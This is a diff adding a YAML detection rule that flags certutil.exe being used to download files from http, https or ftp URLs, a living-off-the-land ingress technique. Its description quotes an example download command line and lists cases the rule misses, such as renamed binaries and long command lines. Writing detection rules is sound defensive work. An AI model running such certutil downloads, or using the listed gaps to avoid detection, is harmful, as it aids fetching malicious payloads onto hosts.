@@ -1,0 +1,54 @@
+title: certutil used to download a file
+id: 0de0758f-a62c-405b-adcf-fb1d602cd321
+status: stable
+description: >
+  certutil.exe was created with a download form of its command line (Sysmon EventID 1, or Windows 4688 with
+  command-line auditing; OCSF class 1002, activity_id 1): -urlcache (certutil -urlcache -split -f http://host/x
+  out.exe) or -verifyctl, each with an http://, https:// or ftp:// URL on the same line, switch spelled with a dash or
+  a slash. Certutil is a signed Windows binary that fetches arbitrary files, which makes it a common "living off the
+  land" ingress tool. Case-folded plain substring tests: the URL requirement keeps certutil -urlcache * delete (cache
+  cleanup), -hashfile, -addstore, -decode and -encode quiet. Not covered: a download from a UNC path or a bare IP
+  without a scheme, certutil -URL (the GUI retrieval dialog), bitsadmin / curl / PowerShell downloads, certutil
+  renamed, and a command line over 1000 characters cut by the parser. Fetching a CRL or CTL over http with -urlcache
+  or -verifyctl is legitimate and will match; tune per site. When certutil is a child of a document host,
+  win_office_spawns_shell fires too. The trigger is a process-creation event, so it carries actor.process.uid and
+  parent_process.uid for ADR-012 process-tree links. Added 2026-11-21 (owner-approved).
+level: high
+logsource:
+  category: process_activity
+detection:
+  launch:
+    class_uid: 1002
+    activity_id: 1
+  certutil_image:
+    unmapped.process_launch.image_base: certutil.exe
+  urlcache_dash:
+    unmapped.process_launch.command_line_lc: {contains: "-urlcache"}
+  urlcache_slash:
+    unmapped.process_launch.command_line_lc: {contains: "/urlcache"}
+  verifyctl_dash:
+    unmapped.process_launch.command_line_lc: {contains: "-verifyctl"}
+  verifyctl_slash:
+    unmapped.process_launch.command_line_lc: {contains: "/verifyctl"}
+  http_url:
+    unmapped.process_launch.command_line_lc: {contains: "http://"}
+  https_url:
+    unmapped.process_launch.command_line_lc: {contains: "https://"}
+  ftp_url:
+    unmapped.process_launch.command_line_lc: {contains: "ftp://"}
+  condition: >-
+    launch and certutil_image and (urlcache_dash or urlcache_slash or verifyctl_dash or verifyctl_slash) and
+    (http_url or https_url or ftp_url)
+fields:
+  - actor.user.name
+  - actor.process.name
+  - actor.process.uid
+  - actor.process.parent_process.uid
+  - unmapped.process_launch.parent
+  - unmapped.process_launch.command_line
+siem:
+  sector: common
+  score_weight: 70
+mitre:
+  tactic: TA0011        # Command and Control
+  technique: T1105      # Ingress Tool Transfer
